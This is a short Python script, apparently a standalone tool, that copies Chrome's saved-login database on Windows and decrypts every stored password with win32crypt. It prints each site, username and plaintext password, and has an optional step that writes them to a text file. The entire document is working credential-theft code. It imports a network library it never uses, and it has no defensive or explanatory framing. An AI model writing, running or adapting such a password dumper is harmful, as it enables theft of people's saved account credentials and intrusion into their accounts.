import os
import shutil
import sqlite3
# pip3 install pypiwin32
import win32crypt
import json
import requests

APP_DATA_PATH = os.environ["LOCALAPPDATA"]
DB_PATH = r'Google\Chrome\User Data\Default\Login Data'


class ChromePassword:

    def __init__(self):
        self.passwordsList = []

    def get_chrome_db(self):
        _full_path = os.path.join(APP_DATA_PATH, DB_PATH)
        _tmp_file = os.path.join(os.environ['LOCALAPPDATA'], 'sqlite_file')
        if os.path.exists(_tmp_file):
            os.remove(_tmp_file)
        shutil.copyfile(_full_path, _tmp_file)
        self.show_passwords(_tmp_file)

    def show_passwords(self, db_file):
        conn = sqlite3.connect(db_file)
        _sql = 'select signon_realm,username_value,password_value from logins'
        for row in conn.execute(_sql):
            ret = win32crypt.CryptUnprotectData(row[2], None, None,None, 0)
            # 密码解析后得到的是字节码，需要进行解码操作
            _info = 'url: %-40s username: %-20s password: %s\n' % (row[0][:50], row[1], ret[1].decode())
            print('url: %-40s username: %-20s password: %s' % (row[0][:50], row[1], ret[1].decode()))
            self.passwordsList.append(_info)
        conn.close()
        os.remove(db_file)

    def save_passwords(self):
        with open('pass_word.txt', 'w', encoding='utf-8') as f:
            f.writelines(self.passwordsList)


if __name__ == '__main__':
    Main = ChromePassword()
    Main.get_chrome_db()
    # Main.save_passwords()
